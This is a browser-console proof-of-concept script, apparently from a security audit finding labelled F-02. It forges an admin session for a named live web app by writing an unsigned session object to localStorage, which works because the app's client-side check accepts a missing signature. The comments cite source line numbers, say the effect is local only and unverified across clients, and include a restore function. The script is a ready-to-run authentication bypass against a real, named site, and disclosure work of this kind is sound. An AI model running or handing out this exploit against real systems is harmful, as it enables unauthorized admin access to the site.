/* F-02 — local admin session forgery (real Chrome, console-only)
 * ================================================================
 * Run: paste into DevTools Console on https://trithuc500.vercel.app/
 *
 * Why this works (hash-pinned source):
 *  - boot reads TRITHUC50_REMEMBER_ADMIN_SESSION_V26 (line 2398)
 *  - accept condition (line 2404):
 *      (!parsedSess.sig || parsedSess.sig === expectedSig) && notExpired
 *    => a missing signature is explicitly accepted.
 *  - `expectedSig` uses a bundle-hardcoded salt (line 2822), but this
 *    payload does NOT need it because `!parsedSess.sig` short-circuits.
 *  - no network call authorizes the session; state.isAdminLoggedIn = true
 *    is set directly at line 2405.
 *
 * Effect: THIS browser profile gets teacher/admin UI state only.
 * NO credential literal, salt, or signature is embedded here.
 * NO ntfy/KV write. NO real account accessed. NO production change.
 *
 * Cleanup: __AERO_F02_RESTORE__() then F5.
 */
(() => {
  'use strict';

  const K_SESSION = 'TRITHUC50_REMEMBER_ADMIN_SESSION_V26';
  const K_BACKUP = 'TRITHUC50_AERO_F02_BACKUP';

  if (localStorage.getItem(K_BACKUP)) {
    return console.warn('[F-02] already active. Restore first with __AERO_F02_RESTORE__()');
  }

  const previous = localStorage.getItem(K_SESSION);
  localStorage.setItem(K_BACKUP, JSON.stringify({
    session: previous,
    savedAt: Date.now()
  }));

  const session = {
    loggedIn: true,
    username: 'admin',   // arbitrary local label; no real credential used
    ts: Date.now()
    // `sig` deliberately absent -> line 2404 accepts it
  };

  localStorage.setItem(K_SESSION, JSON.stringify(session));

  console.table({
    storageKey: K_SESSION,
    loggedIn: session.loggedIn,
    username: session.username,
    hasSig: false,
    note: 'missing signature is accepted by client restore'
  });
  console.log('[F-02] forged session written. Press F5. No login form needed.');

  window.__AERO_F02_RESTORE__ = function () {
    const b = localStorage.getItem(K_BACKUP);
    if (!b) return console.warn('[F-02] no backup found');
    const saved = JSON.parse(b);
    if (saved.session === null) localStorage.removeItem(K_SESSION);
    else localStorage.setItem(K_SESSION, saved.session);
    localStorage.removeItem(K_BACKUP);
    delete window.__AERO_F02_RESTORE__;
    console.log('[F-02] original admin session restored. Press F5.');
    return true;
  };

  return {
    ok: true,
    scope: 'LOCAL ONLY — teacher/admin UI state in this browser profile',
    note: 'No backend authorization exists for privileged actions; cross-client effect UNVERIFIED.'
  };
})();
